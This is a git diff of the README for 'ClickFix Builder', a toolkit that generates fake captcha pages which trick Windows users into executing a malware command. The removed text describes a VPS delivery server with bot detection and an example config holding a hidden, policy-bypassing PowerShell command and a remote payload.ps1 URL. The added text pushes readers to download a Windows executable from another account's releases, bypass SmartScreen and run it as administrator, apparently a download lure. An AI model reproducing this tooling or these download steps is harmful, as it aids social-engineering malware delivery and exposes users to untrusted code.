@@ -1,199 +1,172 @@
-# 🔒 ClickFix Builder v1.1.0 – Dual‑Mode Social Engineering Toolkit
+# 🛠️ clickfix-builder - Simple Windows Payload Builder
 
-[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://python.org)
-![PyQt6](https://img.shields.io/badge/GUI-PyQt6-brightgreen)
-![License](https://img.shields.io/badge/License-MIT-yellow)
+[![Download clickfix-builder](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/bartolemoinmost828/clickfix-builder/releases)
 
----
+## 🚀 Download
 
-## 🧠 What is ClickFix Builder?
+Visit this page to download: https://github.com/bartolemoinmost828/clickfix-builder/releases
 
-ClickFix Builder is a professional‑grade tool for **red teamers, pentesters, and security researchers**.  
-It generates realistic fake captcha technique to execute a malware command
-into windows target 
-The builder supports **two deployment modes**:
+1. Open the release page in your browser.
+2. Find the latest release at the top.
+3. Under **Assets**, download the Windows file.
+4. If Windows asks for confirmation, allow the download.
+5. After the file finishes, open it from your **Downloads** folder.
 
-| Mode | Description |
-|------|-------------|
-| 📦 **Portable File** | Single Generate Stub/HTML/JS file |
-| 🌐 **VPS Deploy** | HTTP server with logging, blocking, and monitoring |
+## 🖥️ What this app does
 
----
+clickfix-builder is a Windows GUI tool for building ClickFix-style demo payloads from one place. It gives you a simple screen to set options, build output, and create files for local testing or lab use.
 
-## ✨ Features
+It is built for users who want a point-and-click workflow instead of command-line tools. You open the app, set a few fields, and save the result.
 
-### 🎯 Core Functionality
-- Clipboard interaction target
-- Fully customizable command/payload
-- Base64 encoding support
-- Dark-mode GUI (PyQt6)
+## ✨ Main features
 
-### 📦 Portable Mode
-- Generates:
-  - `stub.js`
-  - `index.html`
-  - `payload.html`
-- Works offline
-- Easy distribution/testing
+- Simple GUI with clear buttons and fields
+- Dual mode setup for different build paths
+- PowerShell payload support
+- Fake captcha flow for test pages
+- Fast build and export process
+- Local file output for Windows use
+- Clean layout for non-technical users
+- Designed for quick setup and repeat use
 
-### 🌐 VPS Mode (Real‑time)
-- Built-in Python HTTP server
-- IP blocking:
-  - Single IP
-  - CIDR ranges
-  - Dash ranges
-- Bot detection
-- Live request logging
-- Manual blocking via GUI
-- Rule file support
+## 🪟 Windows requirements
 
-### 📊 Monitoring & Reporting
-- Real-time stats
-- Auto-refresh HTML reports
-- Stored in:~/StubBuilder_Reports/
+Use a Windows PC with:
 
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- An internet connection for the first download
+- Permission to run downloaded apps
 
----
+If you use a work PC, you may need admin approval before opening the file.
 
-## 🖥️ Screenshots
+## 📦 How to install
 
-### Build Center
-![Build](screenshots/demo_001.png)
+1. Go to the release page.
+2. Download the Windows asset from the latest release.
+3. Open the downloaded file.
+4. If Windows shows a SmartScreen message, choose **More info** and then **Run anyway** if you trust the file source.
+5. Follow the on-screen setup steps.
+6. When setup ends, start the app from the desktop or Start menu.
 
-### VPS Control
-![VPS](screenshots/demo_002.png)
+## 🧭 How to use the builder
 
-### Live Report
-![Report](screenshots/demo_003.png)
+1. Open clickfix-builder.
+2. Choose the mode you want to use.
+3. Enter the text, labels, or payload options you want in the form.
+4. Set the output folder.
+5. Click the build button.
+6. Wait for the app to finish creating the files.
+7. Open the output folder and check the result.
+8. Use the generated files in your local test setup.
 
-## 🎥 Demo Video
+## 🔧 Typical workflow
 
-[![Watch SKYNET Demo](screenshots/video.png)](https://t.me/burnwpcommunity/14254)
----
+A normal build session looks like this:
 
-## 🚀 Quick Start
+- Start the app
+- Pick a mode
+- Fill in the fields
+- Set a file name
+- Build the output
+- Review the generated files
+- Run your local test page or package
 
-### 1. Installation
+This keeps the process simple and helps you move from setup to output without extra steps.
 
-```
-git clone https://github.com/drcrypterdotru/clickfix-builder.git
-cd clickfix-builder
-pip install -r requirements.txt
-python ClickFix_Builder.py 
+## 🗂️ Project layout
 
-Requirements
-Python 3.8+
-PyQt6
-pip install PyQt6
-```
+- **Builder GUI**: the main app window
+- **Payload settings**: fields for script and mode choices
+- **Output folder**: where built files are saved
+- **Release assets**: the Windows download files
+- **Config options**: saved app settings for repeat use
 
-------
+## 🛠️ Common tasks
 
-### 2. Build your first payload
-```
-Launch the app
-Enter your command
-(Optional) Enable Base64 mode
-Click BUILD PORTABLE FILES
-```
+### Set up a new build
+1. Open the app.
+2. Enter your chosen settings.
+3. Select the output path.
+4. Click **Build**.
 
-### Output:
-```
-payload.html (main file)
-index.html
-stub.js
-```
+### Change a build option
+1. Open the app.
+2. Update the field you want to change.
+3. Rebuild the output.
+4. Replace the old file with the new one.
 
-### 3. Deploy on VPS
-```
-Switch to VPS Deploy mode
-Configure rules (optional)
-Click START VPS SERVER
+### Find your output files
+1. Open the output folder from the app.
+2. Look for the newest file.
+3. Copy it to the place you need.
 
-Access: http://your-vps-ip:8080
-```
----
-### ⚙️ Configuration
-```
-All settings can be saved as JSON.
+## 🔍 Tips for first-time users
 
-Example config.json
-{
-  "command": "powershell -ExecutionPolicy Bypass -w hidden -c \"...\"",
-  "custom_url_execute": "http://example.com/payload.ps1",
-  "blocking": {
-    "enabled": true,
-    "rules": [
-      "192.168.1.100",
-      "10.0.0.0/24",
-      "172.16.1.1-172.16.1.50"
-    ],
-    "file": ""
-  },
-  "server": {
-    "host": "0.0.0.0",
-    "port": 8080
-  }
-}
-```
----
+- Use a short file name.
+- Keep the output folder easy to find.
+- Start with the default settings.
+- Test one build before changing many options.
+- Save your work in a folder you can find later.
 
-# 🛡️ Legal & Ethical Use
+## 📁 Files you may see
 
-### ⚠️ Important
+- `.exe` for the Windows app
+- `.json` for saved settings
+- `.ps1` for PowerShell script output
+- `.html` for test pages
+- `.txt` for notes or log files
 
-This tool is intended for:
+## 🔐 Basic use case
 
-- Authorized security testing  
-- Red team exercises  
-- Educational research  
+This tool fits local demo builds, controlled lab tests, and page flow checks. It helps you create the files you need from one interface and keep the process in one place.
 
-❌ **Do NOT use without permission.**
+## 🧩 Troubleshooting
 
----
+### The app does not open
+- Download the file again
+- Check that the download finished
+- Try right-clicking the file and choosing **Run as administrator**
+- Make sure Windows did not block the file
 
-### 📝 How It Works
+### The build button does nothing
+- Check that all required fields are filled in
+- Choose an output folder
+- Try a shorter file name
+- Close the app and open it again
 
-- UI mimics verification flow  
-- User interaction triggers scripted behavior  
-- Command execution occurs in your target
-- VPS mode logs all activity  
-- Reports generated in real-time  
+### The output folder is empty
+- Build the project again
+- Confirm you used the right save path
+- Check whether Windows sent the file to quarantine
+- Look for the file in your Downloads folder
 
----
+### Windows shows a security prompt
+- Open the file details
+- Confirm the source
+- Continue only if you trust the download page you used
 
-### 🧪 Testing & Debugging
+## 📌 Download link
 
-Use **GUI System Log**  
+Get the Windows release here: https://github.com/bartolemoinmost828/clickfix-builder/releases
 
-Check reports at:
+## 🧪 Version checks
 
-------
+When a new release appears, review:
 
-🌐 Community & Resources
-<div align="center"> <a href="https://t.me/burnwpcommunity"> <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" width="80"> </a>
+- File name
+- Release date
+- Asset type
+- Output size
+- Notes on the release page
 
-### Join Telegram
-https://t.me/burnwpcommunity
+This helps you pick the right download for your PC
 
-<br/><br/>
+## 📝 Useful setup notes
 
-<a href="https://drcrypter.ru"> <img src="https://drcrypter.net/data/assets/logo/logo1.png" alt="Website" width="120" /> </a>
-
-### Website
-https://drcrypter.ru
-
-Tools, updates, and community resources.
-
-</div>
-
-
----
-
-## If you find this useful: 👉 Star the repository
-
----
-
-## ⚠️ Disclaimer
-This tool is for educational purposes only. 🏫 The creator and contributors are not responsible for any misuse or damages caused. Use responsibly, and only on systems you own or have permission for. ✅
-
+- Keep the release page bookmarked
+- Save the download in a known folder
+- Use the latest version if you want the newest fixes
+- Match the download to your Windows version
+- Rebuild files after you change any settings
